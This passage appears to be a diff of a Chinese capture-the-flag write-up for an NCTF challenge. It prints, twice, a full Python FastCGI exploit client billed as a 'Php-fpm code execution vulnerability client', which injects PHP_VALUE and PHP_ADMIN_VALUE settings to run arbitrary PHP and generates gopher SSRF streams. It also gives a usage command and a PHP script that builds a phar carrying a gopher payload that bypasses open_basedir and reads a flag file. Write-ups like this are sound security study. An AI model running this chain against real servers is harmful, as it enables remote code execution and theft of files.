class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">'connect failure! please check your fasctcgi-server !!'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">'response'</span>] = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gopher</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php echo "PWNed";?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line">    parser.add_argument(<span class="string">'-e'</span>, <span class="string">'--ext'</span>, help=<span class="string">'ext absolute path'</span>, default=<span class="string">''</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-if'</span>, <span class="string">'--include_file'</span>, help=<span class="string">'evil.php absolute path'</span>, default=<span class="string">''</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--url_format'</span>, help=<span class="string">'generate gopher stream in url format'</span>, nargs=<span class="string">'?'</span>,const=<span class="number">1</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-b'</span>, <span class="string">'--base64_format'</span>, help=<span class="string">'generate gopher stream in base64 format'</span>, nargs=<span class="string">'?'</span>,const=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(args.code),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.ext <span class="keyword">and</span> args.include_file:</span><br><span class="line">        <span class="comment">#params['PHP_ADMIN_VALUE']='extension = '+args.ext</span></span><br><span class="line">        params[<span class="string">'PHP_ADMIN_VALUE'</span>]=<span class="string">"extension_dir = /var/www/html\nextension = ant.so"</span></span><br><span class="line">        params[<span class="string">'PHP_VALUE'</span>]=<span class="string">'auto_prepend_file = '</span>+args.include_file</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.url_format <span class="keyword">and</span> <span class="keyword">not</span> args.base64_format :</span><br><span class="line">        response = client.request(params, args.code)</span><br><span class="line">        print(force_text(response))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response = client.gopher(params, args.code)</span><br><span class="line">        <span class="keyword">if</span> args.url_format:</span><br><span class="line">            print(urllib.quote(response))</span><br><span class="line">        <span class="keyword">if</span> args.base64_format:</span><br><span class="line">            print(base64.b64encode(response))</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import socket
+import random
+import argparse
+import sys
+from io import BytesIO
+import base64
+import urllib
+
+# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
+
+PY2 = True if sys.version_info.major == 2 else False
+
+def bchr(i):
+    if PY2:
+        return force_bytes(chr(i))
+    else:
+        return bytes([i])
+
+def bord(c):
+    if isinstance(c, int):
+        return c
+    else:
+        return ord(c)
+
+def force_bytes(s):
+    if isinstance(s, bytes):
+        return s
+    else:
+        return s.encode(&#39;utf-8&#39;, &#39;strict&#39;)
+
+def force_text(s):
+    if issubclass(type(s), str):
+        return s
+    if isinstance(s, bytes):
+        s = str(s, &#39;utf-8&#39;, &#39;strict&#39;)
+    else:
+        s = str(s)
+    return s
+
+class FastCGIClient:
+    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;
+
+    # private
+    __FCGI_VERSION = 1
+
+    __FCGI_ROLE_RESPONDER = 1
+    __FCGI_ROLE_AUTHORIZER = 2
+    __FCGI_ROLE_FILTER = 3
+
+    __FCGI_TYPE_BEGIN = 1
+    __FCGI_TYPE_ABORT = 2
+    __FCGI_TYPE_END = 3
+    __FCGI_TYPE_PARAMS = 4
+    __FCGI_TYPE_STDIN = 5
+    __FCGI_TYPE_STDOUT = 6
+    __FCGI_TYPE_STDERR = 7
+    __FCGI_TYPE_DATA = 8
+    __FCGI_TYPE_GETVALUES = 9
+    __FCGI_TYPE_GETVALUES_RESULT = 10
+    __FCGI_TYPE_UNKOWNTYPE = 11
+
+    __FCGI_HEADER_SIZE = 8
+
+    # request state
+    FCGI_STATE_SEND = 1
+    FCGI_STATE_ERROR = 2
+    FCGI_STATE_SUCCESS = 3
+
+    def __init__(self, host, port, timeout, keepalive):
+        self.host = host
+        self.port = port
+        self.timeout = timeout
+        if keepalive:
+            self.keepalive = 1
+        else:
+            self.keepalive = 0
+        self.sock = None
+        self.requests = dict()
+
+    def __connect(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(self.timeout)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # if self.keepalive:
+        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
+        # else:
+        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
+        try:
+            self.sock.connect((self.host, int(self.port)))
+        except socket.error as msg:
+            self.sock.close()
+            self.sock = None
+            print(repr(msg))
+            return False
+        return True
+
+    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
+        length = len(content)
+        buf = bchr(FastCGIClient.__FCGI_VERSION) \
+               + bchr(fcgi_type) \
+               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \
+               + bchr(requestid &amp; 0xFF) \
+               + bchr((length &gt;&gt; 8) &amp; 0xFF) \
+               + bchr(length &amp; 0xFF) \
+               + bchr(0) \
+               + bchr(0) \
+               + content
+        return buf
+
+    def __encodeNameValueParams(self, name, value):
+        nLen = len(name)
+        vLen = len(value)
+        record = b&#39;&#39;
+        if nLen &lt; 128:
+            record += bchr(nLen)
+        else:
+            record += bchr((nLen &gt;&gt; 24) | 0x80) \
+                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \
+                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \
+                      + bchr(nLen &amp; 0xFF)
+        if vLen &lt; 128:
+            record += bchr(vLen)
+        else:
+            record += bchr((vLen &gt;&gt; 24) | 0x80) \
+                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \
+                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \
+                      + bchr(vLen &amp; 0xFF)
+        return record + name + value
+
+    def __decodeFastCGIHeader(self, stream):
+        header = dict()
+        header[&#39;version&#39;] = bord(stream[0])
+        header[&#39;type&#39;] = bord(stream[1])
+        header[&#39;requestId&#39;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])
+        header[&#39;contentLength&#39;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])
+        header[&#39;paddingLength&#39;] = bord(stream[6])
+        header[&#39;reserved&#39;] = bord(stream[7])
+        return header
+
+    def __decodeFastCGIRecord(self, buffer):
+        header = buffer.read(int(self.__FCGI_HEADER_SIZE))
+
+        if not header:
+            return False
+        else:
+            record = self.__decodeFastCGIHeader(header)
+            record[&#39;content&#39;] = b&#39;&#39;
+
+            if &#39;contentLength&#39; in record.keys():
+                contentLength = int(record[&#39;contentLength&#39;])
+                record[&#39;content&#39;] += buffer.read(contentLength)
+            if &#39;paddingLength&#39; in record.keys():
+                skiped = buffer.read(int(record[&#39;paddingLength&#39;]))
+            return record
+
+    def request(self, nameValuePairs={}, post=&#39;&#39;):
+        if not self.__connect():
+            print(&#39;connect failure! please check your fasctcgi-server !!&#39;)
+            return
+
+        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)
+        self.requests[requestId] = dict()
+        request = b&quot;&quot;
+        beginFCGIRecordContent = bchr(0) \
+                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
+                                 + bchr(self.keepalive) \
+                                 + bchr(0) * 5
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
+                                              beginFCGIRecordContent, requestId)
+        paramsRecord = b&#39;&#39;
+        if nameValuePairs:
+            for (name, value) in nameValuePairs.items():
+                name = force_bytes(name)
+                value = force_bytes(value)
+                paramsRecord += self.__encodeNameValueParams(name, value)
+
+        if paramsRecord:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId)
+
+        if post:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId)
+
+        self.sock.send(request)
+        self.requests[requestId][&#39;state&#39;] = FastCGIClient.FCGI_STATE_SEND
+        self.requests[requestId][&#39;response&#39;] = b&#39;&#39;
+        return self.__waitForResponse(requestId)
+
+    def gopher(self, nameValuePairs={}, post=&#39;&#39;):
+
+        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)
+        self.requests[requestId] = dict()
+        request = b&quot;&quot;
+        beginFCGIRecordContent = bchr(0) \
+                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
+                                 + bchr(self.keepalive) \
+                                 + bchr(0) * 5
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
+                                              beginFCGIRecordContent, requestId)
+        paramsRecord = b&#39;&#39;
+        if nameValuePairs:
+            for (name, value) in nameValuePairs.items():
+                name = force_bytes(name)
+                value = force_bytes(value)
+                paramsRecord += self.__encodeNameValueParams(name, value)
+
+        if paramsRecord:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#39;&#39;, requestId)
+
+        if post:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#39;&#39;, requestId)
+        return request
+
+    def __waitForResponse(self, requestId):
+        data = b&#39;&#39;
+        while True:
+            buf = self.sock.recv(512)
+            if not len(buf):
+                break
+            data += buf
+
+        data = BytesIO(data)
+        while True:
+            response = self.__decodeFastCGIRecord(data)
+            if not response:
+                break
+            if response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDOUT \
+                    or response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDERR:
+                if response[&#39;type&#39;] == FastCGIClient.__FCGI_TYPE_STDERR:
+                    self.requests[&#39;state&#39;] = FastCGIClient.FCGI_STATE_ERROR
+                if requestId == int(response[&#39;requestId&#39;]):
+                    self.requests[requestId][&#39;response&#39;] += response[&#39;content&#39;]
+            if response[&#39;type&#39;] == FastCGIClient.FCGI_STATE_SUCCESS:
+                self.requests[requestId]
+        return self.requests[requestId][&#39;response&#39;]
+
+    def __repr__(self):
+        return &quot;fastcgi connect host:{} port:{}&quot;.format(self.host, self.port)
+
+if __name__ == &#39;__main__&#39;:
+    parser = argparse.ArgumentParser(description=&#39;Php-fpm code execution vulnerability client.&#39;)
+    parser.add_argument(&#39;host&#39;, help=&#39;Target host, such as 127.0.0.1&#39;)
+    parser.add_argument(&#39;file&#39;, help=&#39;A php file absolute path, such as /usr/local/lib/php/System.php&#39;)
+    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, help=&#39;What php code your want to execute&#39;, default=&#39;&lt;?php echo &quot;PWNed&quot;;?&gt;&#39;)
+    parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help=&#39;FastCGI port&#39;, default=9000, type=int)
+    parser.add_argument(&#39;-e&#39;, &#39;--ext&#39;, help=&#39;ext absolute path&#39;, default=&#39;&#39;)
+    parser.add_argument(&#39;-if&#39;, &#39;--include_file&#39;, help=&#39;evil.php absolute path&#39;, default=&#39;&#39;)
+    parser.add_argument(&#39;-u&#39;, &#39;--url_format&#39;, help=&#39;generate gopher stream in url format&#39;, nargs=&#39;?&#39;,const=1)
+    parser.add_argument(&#39;-b&#39;, &#39;--base64_format&#39;, help=&#39;generate gopher stream in base64 format&#39;, nargs=&#39;?&#39;,const=1)
+
+    args = parser.parse_args()
+
+    client = FastCGIClient(args.host, args.port, 3, 0)
+    params = dict()
+    documentRoot = &quot;/&quot;
+    uri = args.file
+    params = {
+        &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;,
+        &#39;REQUEST_METHOD&#39;: &#39;POST&#39;,
+        &#39;SCRIPT_FILENAME&#39;: documentRoot + uri.lstrip(&#39;/&#39;),
+        &#39;SCRIPT_NAME&#39;: uri,
+        &#39;QUERY_STRING&#39;: &#39;&#39;,
+        &#39;REQUEST_URI&#39;: uri,
+        &#39;DOCUMENT_ROOT&#39;: documentRoot,
+        &#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;,
+        &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
+        &#39;REMOTE_PORT&#39;: &#39;9985&#39;,
+        &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
+        &#39;SERVER_PORT&#39;: &#39;80&#39;,
+        &#39;SERVER_NAME&#39;: &quot;localhost&quot;,
+        &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;,
+        &#39;CONTENT_TYPE&#39;: &#39;application/text&#39;,
+        &#39;CONTENT_LENGTH&#39;: &quot;%d&quot; % len(args.code),
+        &#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;,
+        &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39;
+    }
+
+    if args.ext and args.include_file:
+        #params[&#39;PHP_ADMIN_VALUE&#39;]=&#39;extension = &#39;+args.ext
+        params[&#39;PHP_ADMIN_VALUE&#39;]=&quot;extension_dir = /var/www/html\nextension = ant.so&quot;
+        params[&#39;PHP_VALUE&#39;]=&#39;auto_prepend_file = &#39;+args.include_file
+    if not args.url_format and not args.base64_format :
+        response = client.request(params, args.code)
+        print(force_text(response))
+    else:
+        response = client.gopher(params, args.code)
+        if args.url_format:
+            print(urllib.quote(response))
+        if args.base64_format:
+            print(base64.b64encode(response))</code></pre>
 <p>调用时，依据主机ip修改参数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 173.0.168.10 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -p 9000 -c &lt;?php phpinfo();?&gt; -u</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exp"><br>生成的数据流我们再度生成phar文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url=<span class="string">"gopher://173.0.168.10:9000/_%01%01%B4U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B4U%01%DC%00%00%0E%03CONTENT_LENGTH172%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%B4U%00%00%00%00%01%05%B4U%00%AC%00%00%3C%3Fphp%20mkdir%28%27byc%27%29%3Bchdir%28%27byc%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%20%3F%3E%01%05%B4U%00%00%00%00"</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$o=<span class="keyword">new</span> Main();</span><br><span class="line">$p-&gt;setMetadata($o);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<pre><code>python exp.py 173.0.168.10 /var/www/html/index.php -p 9000 -c &lt;?php phpinfo();?&gt; -u </code></pre><p><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exp"><br>生成的数据流我们再度生成phar文件</p>
+<pre><code class="php">&lt;?php
+
+class Main {
+    public $url=&quot;gopher://173.0.168.10:9000/_%01%01%B4U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B4U%01%DC%00%00%0E%03CONTENT_LENGTH172%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%B4U%00%00%00%00%01%05%B4U%00%AC%00%00%3C%3Fphp%20mkdir%28%27byc%27%29%3Bchdir%28%27byc%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%20%3F%3E%01%05%B4U%00%00%00%00&quot;;
+}
+@unlink(&#39;phar.phar&#39;);
+$p = new Phar(&#39;phar.phar&#39;);
+$p-&gt;startBuffering();
+$p-&gt;setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+$o=new Main();
+$p-&gt;setMetadata($o);
+$p-&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);
+$p-&gt;stopBuffering();</code></pre>
